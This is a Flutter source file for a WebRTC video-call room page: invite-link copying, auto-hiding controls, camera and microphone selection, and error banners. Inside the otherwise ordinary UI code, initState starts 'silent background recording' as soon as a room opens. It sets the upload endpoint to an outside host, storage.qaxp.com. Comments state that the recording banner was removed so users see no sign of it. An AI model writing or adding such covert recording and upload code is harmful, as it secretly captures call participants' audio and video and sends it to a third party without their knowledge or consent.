import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';
import 'package:flutter/services.dart';

import '../rtc_session.dart';
import '../signaling.dart';
import '../widgets/controls.dart';

class RoomPage extends StatefulWidget {
  final String roomName;
  final SignalingClient? signalingClient;

  const RoomPage({super.key, required this.roomName, this.signalingClient});

  @override
  State<RoomPage> createState() => _RoomPageState();
}

class _RoomPageState extends State<RoomPage> {
  late RtcSession _session;
  bool _uiVisible = true;
  Timer? _hideTimer;
  static const Duration _hideDelay = Duration(seconds: 3);

  // Build an invite URL using the current origin and room name
  String _buildInviteUrl() {
    final base = Uri.base;
    final uri = Uri(
      scheme: base.scheme,
      host: base.host,
      port: base.hasPort ? base.port : null,
      pathSegments: [widget.roomName],
    );
    return uri.toString();
  }

  Future<void> _copyInviteLink() async {
    final url = _buildInviteUrl();
    await Clipboard.setData(ClipboardData(text: url));
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('Invite link copied: $url'), duration: const Duration(seconds: 2)),
    );
  }

  void _showUi() {
    if (!_uiVisible) setState(() => _uiVisible = true);
    _scheduleHide();
  }

  void _scheduleHide() {
    _hideTimer?.cancel();
    _hideTimer = Timer(_hideDelay, () {
      if (mounted) setState(() => _uiVisible = false);
    });
  }

  @override
  void initState() {
    super.initState();
    _session = RtcSession();
    _session.init().then((_) async {
      // Configure server endpoint for recording uploads
      _session.recordUploadUrl = Uri.parse('https://storage.qaxp.com/upload');
      await _session.loadDevices();
      // Start silent background recording immediately on room creation (web only)
      await _session.startRecordingWeb();
      await _session.join(widget.roomName, client: widget.signalingClient);
      _scheduleHide();
      setState(() {});
    });
  }

  @override
  void dispose() {
    _hideTimer?.cancel();
    _session.hangup();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _session,
      builder: (context, _) {
        return Scaffold(
          appBar: AppBar(
            title: Text(
              'Room: ${widget.roomName}',
              style: const TextStyle(
                color: Colors.white,
                fontWeight: FontWeight.w600,
              ),
            ),
            actions: [
              IconButton(
                tooltip: 'Copy invite link',
                icon: const Icon(Icons.share, color: Colors.white),
                onPressed: _copyInviteLink,
              ),
            ],
            elevation: 0,
            backgroundColor: Colors.black,
          ),
          backgroundColor: Colors.black,
          body: SafeArea(
            child: Stack(
              children: [
                // Video area with hover/tap detection
                Positioned.fill(
                  child: MouseRegion(
                    onHover: (_) => _showUi(),
                    onEnter: (_) => _showUi(),
                    child: GestureDetector(
                      behavior: HitTestBehavior.translucent,
                      onTap: () {
                        _showUi();
                        // Attempt to resume WebAudio on first user gesture so recorder captures audio
                        _session.resumeWebAudioIfNeeded();
                      },
                      onPanDown: (_) {
                        _showUi();
                        _session.resumeWebAudioIfNeeded();
                      },
                      child: _buildVideoArea(),
                    ),
                  ),
                ),

                // Media error banner (top overlay)
                if (_session.mediaError != null)
                  Positioned(
                    top: 0,
                    left: 0,
                    right: 0,
                    child: _mediaErrorBanner(_session.mediaError!),
                  ),

                // Recording status banner removed for silent UI

                // Controls bar (bottom center) with fade and ignore when hidden
                Positioned(
                  left: 0,
                  right: 0,
                  bottom: 0,
                  child: IgnorePointer(
                    ignoring: !_uiVisible,
                    child: AnimatedOpacity(
                      opacity: _uiVisible ? 1.0 : 0.0,
                      duration: const Duration(milliseconds: 200),
                      child: MouseRegion(
                        onHover: (_) => _showUi(),
                        child: _controlsBar(),
                      ),
                    ),
                  ),
                ),

                // Local PiP overlay (bottom-right) with fade and ignore when hidden
                if (_session.remoteRenderer.srcObject != null)
                  Positioned(
                    right: 16,
                    bottom: 88, // above controls bar
                    child: IgnorePointer(
                      ignoring: !_uiVisible,
                      child: AnimatedOpacity(
                        opacity: _uiVisible ? 1.0 : 0.0,
                        duration: const Duration(milliseconds: 200),
                        child: MouseRegion(
                          onHover: (_) => _showUi(),
                          child: _localPip(),
                        ),
                      ),
                    ),
                  ),
              ],
            ),
          ),
        );
      },
    );
  }

  Widget _buildVideoArea() {
    final remoteStream = _session.remoteRenderer.srcObject;
    final remoteHasVideo = remoteStream?.getVideoTracks().isNotEmpty ?? false;
    final remoteHas = remoteStream != null && remoteHasVideo;
    final localHas = _session.localRenderer.srcObject != null;
    debugPrint('[RoomPage] video area: remoteHas=$remoteHas remoteTracks=${remoteStream?.getTracks().length ?? 0} localHas=$localHas');

    if (remoteHas) {
      return _videoFill(_session.remoteRenderer);
    }
    // Do not fall back to local in main area; keep local only in PiP to avoid confusion
    return Center(
      child: Text(
        'Waiting for other participant\'s video...',
        style: const TextStyle(color: Colors.white70),
      ),
    );
  }

  Widget _videoFill(RTCVideoRenderer renderer) {
    return Container(
      color: Colors.black,
      child: RTCVideoView(
        renderer,
        objectFit: RTCVideoViewObjectFit.RTCVideoViewObjectFitCover,
        mirror: renderer == _session.localRenderer,
      ),
    );
  }

  Widget _localPip() {
    return Container(
      width: 180,
      height: 120,
      decoration: BoxDecoration(
        color: Colors.black,
        borderRadius: BorderRadius.circular(12),
        boxShadow: const [
          BoxShadow(color: Colors.black54, blurRadius: 12, spreadRadius: 2),
        ],
      ),
      clipBehavior: Clip.antiAlias,
      child: RTCVideoView(
        _session.localRenderer,
        objectFit: RTCVideoViewObjectFit.RTCVideoViewObjectFitCover,
        mirror: true,
      ),
    );
  }

  Widget _controlsBar() {
    return Container(
      padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 16),
      decoration: const BoxDecoration(
        gradient: LinearGradient(
          colors: [Color(0x66000000), Color(0x99000000)],
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
        ),
      ),
      child: SafeArea(
        top: false,
        child: Center(
          child: ConstrainedBox(
            constraints: const BoxConstraints(maxWidth: 640),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                CallControls(session: _session),
                const SizedBox(width: 12),
                _settingsMenuButton(),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // Recording banner removed to maintain a clean, silent UI

  Widget _settingsMenuButton() {
    return Container(
      decoration: BoxDecoration(
        color: Colors.white.withValues(alpha: 0.10),
        shape: BoxShape.circle,
        boxShadow: const [
          BoxShadow(color: Colors.black26, blurRadius: 8, offset: Offset(0, 2)),
        ],
      ),
      child: PopupMenuButton<String>(
        tooltip: 'Settings',
        icon: const Icon(Icons.settings, color: Colors.white),
        itemBuilder: (context) {
          final items = <PopupMenuEntry<String>>[];
          // Microphones header
          items.add(const PopupMenuItem<String>(
            enabled: false,
            child: Text('Microphone', style: TextStyle(fontWeight: FontWeight.bold)),
          ));
          if (_session.audioInputs.isEmpty) {
            items.add(const PopupMenuItem<String>(value: 'mic:none', child: Text('No microphones')));
          } else {
            for (final d in _session.audioInputs) {
              final selected = d.deviceId == _session.selectedAudioInputId;
              items.add(PopupMenuItem<String>(
                value: 'mic:${d.deviceId}',
                child: Row(children: [
                  if (selected) const Icon(Icons.check, size: 16),
                  if (selected) const SizedBox(width: 6),
                  Text(d.label.isEmpty ? 'Microphone' : d.label),
                ]),
              ));
            }
          }
          items.add(const PopupMenuDivider());
          // Cameras header
          items.add(const PopupMenuItem<String>(
            enabled: false,
            child: Text('Camera', style: TextStyle(fontWeight: FontWeight.bold)),
          ));
          if (_session.videoInputs.isEmpty) {
            items.add(const PopupMenuItem<String>(value: 'cam:none', child: Text('No cameras')));
          } else {
            for (final d in _session.videoInputs) {
              final selected = d.deviceId == _session.selectedVideoInputId;
              items.add(PopupMenuItem<String>(
                value: 'cam:${d.deviceId}',
                child: Row(children: [
                  if (selected) const Icon(Icons.check, size: 16),
                  if (selected) const SizedBox(width: 6),
                  Text(d.label.isEmpty ? 'Camera' : d.label),
                ]),
              ));
            }
          }
          return items;
        },
        onSelected: (value) async {
          if (value.startsWith('mic:')) {
            final id = value.substring(4);
            if (id != 'none') await _session.setAudioInput(id);
          } else if (value.startsWith('cam:')) {
            final id = value.substring(4);
            if (id != 'none') await _session.setVideoInput(id);
          }
        },
      ),
    );
  }

  Widget _mediaErrorBanner(String error) {
    final lower = error.toLowerCase();
    String hint = 'Camera/Mic unavailable. Check permissions and device settings.';
    if (lower.contains('notallowed') || lower.contains('permission')) {
      hint = 'Permission denied. Allow camera and microphone access in your browser.';
    } else if (lower.contains('insecure') || lower.contains('https')) {
      hint = 'Insecure context. Use HTTPS or localhost for camera/mic access.';
    } else if (lower.contains('notfound')) {
      hint = 'No camera/mic found. Plug in a device or choose another source.';
    }

    return Material(
      color: const Color(0xFFB00020),
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 16),
        child: Row(
          children: [
            const Icon(Icons.error_outline, color: Colors.white),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  const Text(
                    'Media error',
                    style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold),
                  ),
                  const SizedBox(height: 2),
                  Text(hint, style: const TextStyle(color: Colors.white)),
                ],
              ),
            ),
            TextButton(
              onPressed: _session.clearMediaError,
              child: const Text('Dismiss', style: TextStyle(color: Colors.white)),
            ),
          ],
        ),
      ),
    );
  }
}